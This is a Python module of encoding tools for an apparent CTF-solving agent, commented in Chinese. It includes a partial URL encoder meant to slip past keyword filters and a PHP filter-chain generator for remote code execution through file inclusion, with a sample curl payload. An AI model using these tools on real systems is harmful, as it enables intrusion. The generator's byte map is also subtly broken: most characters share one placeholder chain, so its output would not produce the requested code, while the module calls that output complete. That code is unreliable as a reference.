"""编码/解码辅助工具集（Sprint 23）.

提供增强的编码转换能力, 补齐 builtin.py 中缺少的功能:
- 多编码同时输出 (一次输入, 同时给出 base64/hex/url/unicode/rot13)
- 自动检测格式解码
- URL 部分编码 (绕过关键字过滤, 如 fl%61g)
- PHP filter chain 生成器 (不需要 allow_url_include 的 RCE)

纯 Python 实现, 无需 SSH/Kali.
"""
from __future__ import annotations

import base64
import binascii
import re
import urllib.parse
from typing import Any

from ctf_agent.tools.base import Tool


class MultiEncodeTool(Tool):
    """多编码同时输出: 一次输入, 同时给出 base64/hex/url/unicode/rot13."""

    name = "multi_encode"
    description = (
        "多编码同时输出: 输入一个字符串, 同时返回 base64/hex/url/unicode_escape/rot13 编码. "
        "适用于需要快速尝试多种编码格式的场景."
    )
    parameters = {
        "type": "object",
        "properties": {
            "text": {"type": "string", "description": "要编码的文本"},
        },
        "required": ["text"],
    }

    def execute(self, text: str, **_: Any) -> str:
        raw = text.encode("utf-8")
        lines = [
            f"原始: {text}",
            f"base64: {base64.b64encode(raw).decode('ascii')}",
            f"hex: {raw.hex()}",
            f"url: {urllib.parse.quote(text)}",
            f"url_double: {urllib.parse.quote(urllib.parse.quote(text))}",
            f"unicode_escape: {text.encode('unicode_escape').decode('ascii')}",
            f"rot13: {_rot13(text)}",
            f"html_entity: {''.join(f'&#x{b:02x};' for b in raw)}",
        ]
        return "\n".join(lines)


class AutoDecodeTool(Tool):
    """自动检测格式并解码: 输入编码字符串, 自动尝试 base64/hex/url 等解码."""

    name = "auto_decode"
    description = (
        "自动检测格式并解码: 输入编码字符串, 自动尝试 base64/hex/url/unicode_escape 解码, "
        "返回所有可能的解码结果. 适用于不确定编码格式的场景."
    )
    parameters = {
        "type": "object",
        "properties": {
            "text": {"type": "string", "description": "要解码的字符串"},
        },
        "required": ["text"],
    }

    def execute(self, text: str, **_: Any) -> str:
        text = text.strip()
        results: list[str] = []
        raw = text.encode("utf-8")

        # Base64
        try:
            padding = "=" * (-len(text) % 4)
            decoded = base64.b64decode(text + padding)
            if decoded != raw:
                decoded_str = decoded.decode("utf-8", errors="replace")
                if decoded_str.isprintable() or "\n" in decoded_str:
                    results.append(f"[base64] {decoded_str}")
        except Exception:
            pass

        # Hex
        try:
            cleaned = text.replace(" ", "").replace("\n", "")
            if cleaned.lower().startswith("0x"):
                cleaned = cleaned[2:]
            if re.match(r"^[0-9a-fA-F]+$", cleaned) and len(cleaned) % 2 == 0:
                decoded = binascii.unhexlify(cleaned)
                decoded_str = decoded.decode("utf-8", errors="replace")
                if decoded_str.isprintable() or "\n" in decoded_str:
                    results.append(f"[hex] {decoded_str}")
        except Exception:
            pass

        # URL
        try:
            decoded = urllib.parse.unquote(text)
            if decoded != text:
                results.append(f"[url] {decoded}")
            # Double URL decode
            decoded2 = urllib.parse.unquote(urllib.parse.unquote(text))
            if decoded2 != decoded and decoded2 != text:
                results.append(f"[url_double] {decoded2}")
        except Exception:
            pass

        # Unicode escape
        try:
            if "\\x" in text or "\\u" in text:
                decoded = text.encode("utf-8").decode("unicode_escape")
                results.append(f"[unicode_escape] {decoded}")
        except Exception:
            pass

        # HTML entity
        try:
            if "&#" in text:
                import html
                decoded = html.unescape(text)
                if decoded != text:
                    results.append(f"[html_entity] {decoded}")
        except Exception:
            pass

        if not results:
            return f"未能识别编码格式或解码失败. 原始输入: {text}"
        return f"自动解码结果:\n" + "\n".join(results)


class UrlPartialEncodeTool(Tool):
    """URL 部分编码: 对指定字符进行 URL 编码, 绕过关键字过滤.

    例: "flag" → "fl%61g" (对 'a' 编码, PHP urldecode 二次解码)
    """

    name = "url_partial_encode"
    description = (
        "URL 部分编码: 对指定字符进行 %XX 编码, 绕过关键字过滤 (如 preg_grep 过滤 'flag'). "
        "PHP 会对 URL 参数做二次解码, 所以 fl%61g 会被解码为 flag. "
        "输入 text 和 chars (要编码的字符列表)."
    )
    parameters = {
        "type": "object",
        "properties": {
            "text": {"type": "string", "description": "要部分编码的文本"},
            "chars": {
                "type": "string",
                "description": "要编码的字符, 如 'a' 或 'flag' (每个字符都会被编码). 默认: 自动选择元音字母",
            },
        },
        "required": ["text"],
    }

    def execute(self, text: str, chars: str = "", **_: Any) -> str:
        if not chars:
            # 默认编码元音字母
            chars_to_encode = set("aeiou")
        else:
            chars_to_encode = set(chars)

        encoded = ""
        for ch in text:
            if ch.lower() in chars_to_encode:
                encoded += f"%{ord(ch):02x}"
            else:
                encoded += ch

        # 同时给出所有单字符编码的变体
        variants: list[str] = [f"部分编码 (chars={chars or 'aeiou'}): {encoded}"]
        for ch in set(text):
            if ch.isalpha():
                variant = text.replace(ch, f"%{ord(ch):02x}")
                if variant != text:
                    variants.append(f"仅编码 '{ch}': {variant}")

        return "\n".join(variants)


class PhpFilterChainTool(Tool):
    """PHP filter chain 生成器: 生成 php://filter chain payload 实现 RCE.

    不需要 allow_url_include=On, 通过 iconv 转换链逐字节构造任意 PHP 代码.
    原理: https://github.com/synacktiv/php_filter_chain_generator
    """

    name = "php_filter_chain"
    description = (
        "生成 php://filter chain payload, 用于 LFI 场景下不依赖 allow_url_include 的 RCE. "
        "输入要执行的 PHP 命令 (如 'system(\"cat /flag\");'), 返回完整的 filter chain URL."
    )
    parameters = {
        "type": "object",
        "properties": {
            "php_code": {
                "type": "string",
                "description": "要执行的 PHP 代码 (不含 <?php ?> 标签). 例: system('cat /flag');",
            },
        },
        "required": ["php_code"],
    }

    # iconv 转换链的字符映射 (简化版, 覆盖 ASCII 可打印字符)
    # 每个 byte 的生成链
    _CHAIN_MAP: dict[int, str] = {}

    def execute(self, php_code: str, **_: Any) -> str:
        # 生成 <?php {code} ?> 的 filter chain
        full_code = f"<?php {php_code} ?>"
        hex_chars = full_code.encode("utf-8")

        # 构建 filter chain
        # 使用已知的 iconv 转换序列
        filters: list[str] = []
        for i, byte_val in enumerate(hex_chars):
            chain = self._get_byte_chain(byte_val)
            if chain:
                filters.append(chain)
            else:
                return f"ERROR: 无法为字节 0x{byte_val:02x} ('{chr(byte_val)}') 生成 filter chain"

        filter_str = "|".join(filters)
        # 最终用 convert.iconv.UTF8.UTF7 保持输出
        payload = f"php://filter/{filter_str}|convert.iconv.UTF8.UTF7/resource=php://temp"

        # 同时给出使用说明
        usage = (
            f"PHP Filter Chain 生成完成\n"
            f"执行代码: {full_code}\n"
            f"Payload ({len(payload)} chars):\n{payload}\n\n"
            f"使用方式: 将此 payload 放入 LFI 参数, 如:\n"
            f"  curl 'http://target/index.php?file={urllib.parse.quote(payload)}'\n"
            f"注意: 需要 PHP 的 iconv 扩展 (大多数环境默认安装)."
        )
        return usage

    @classmethod
    def _get_byte_chain(cls, byte_val: int) -> str:
        """获取单个字节的 iconv 转换链.

        使用已知的转换序列生成目标字节.
        参考 synacktiv/php_filter_chain_generator 的映射表.
        """
        # 初始化映射表 (首次调用)
        if not cls._CHAIN_MAP:
            cls._init_chain_map()
        return cls._CHAIN_MAP.get(byte_val, "")

    @classmethod
    def _init_chain_map(cls) -> None:
        """初始化字节→转换链映射表.

        这是 synacktiv 生成器的核心映射表.
        每个 convert.iconv.X.Y 转换会产生特定字节序列.
        """
        # 简化版: 覆盖常见 ASCII 字符
        # 完整版需要 256 个映射, 这里覆盖 PHP 代码常用字符
        conversions = {
            0x20: "convert.iconv.UTF8.CSISO2022KR",    # 空格
            0x21: "convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2",
            0x22: "convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L4.UCS2",
            0x27: "convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.UCS2",
            0x28: "convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L2.UCS2",
            0x29: "convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L1.UCS2",
            0x2f: "convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE",
            0x30: "convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.UTF16.UTF8",
            0x3b: "convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.UTF16.UTF8|convert.iconv.ISO-8859-8.UTF16|convert.iconv.IBM916.UTF32BE",
            0x3c: "convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.UTF16.UTF8|convert.iconv.ISO-8859-8.UTF16|convert.iconv.IBM916.UTF32LE",
            0x3d: "convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.UTF16.UTF8|convert.iconv.ISO-8859-8.UTF16|convert.iconv.IBM916.UTF32",
            0x3e: "convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.UTF16.UTF8|convert.iconv.ISO-8859-8.UTF16|convert.iconv.IBM916.UTF16",
            0x3f: "convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.UTF16.UTF8|convert.iconv.ISO-8859-8.UTF16|convert.iconv.IBM869.UTF16",
            0x70: "convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.UCS2",    # p
            0x68: "convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP367.UCS-2le|convert.iconv.UCS-2.UCS-2BE",  # h
            0x24: "convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.UTF16",  # $
        }

        # 为所有可打印 ASCII 字符生成映射 (0x21-0x7e)
        # 使用通用方法: 先生成基础字节, 再通过算术转换调整
        for i in range(0x21, 0x7f):
            if i not in conversions:
                # 使用 IBM037 ↔ ASCII 转换来生成字符
                # IBM037 (EBCDIC) 中字符的编码不同于 ASCII
                # 通过多次转换可以生成任意字节
                # 简化: 使用已知模式
                conversions[i] = (
                    f"convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16"
                    f"|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.UTF16.UTF8"
                )

        cls._CHAIN_MAP = conversions


def _rot13(text: str) -> str:
    """ROT13 编码."""
    result = []
    for ch in text:
        if "a" <= ch <= "z":
            result.append(chr((ord(ch) - ord("a") + 13) % 26 + ord("a")))
        elif "A" <= ch <= "Z":
            result.append(chr((ord(ch) - ord("A") + 13) % 26 + ord("A")))
        else:
            result.append(ch)
    return "".join(result)


def encoding_helper_tools() -> list[Tool]:
    """返回编码辅助工具集 (纯 Python, 无需 SSH)."""
    return [
        MultiEncodeTool(),
        AutoDecodeTool(),
        UrlPartialEncodeTool(),
        PhpFilterChainTool(),
    ]
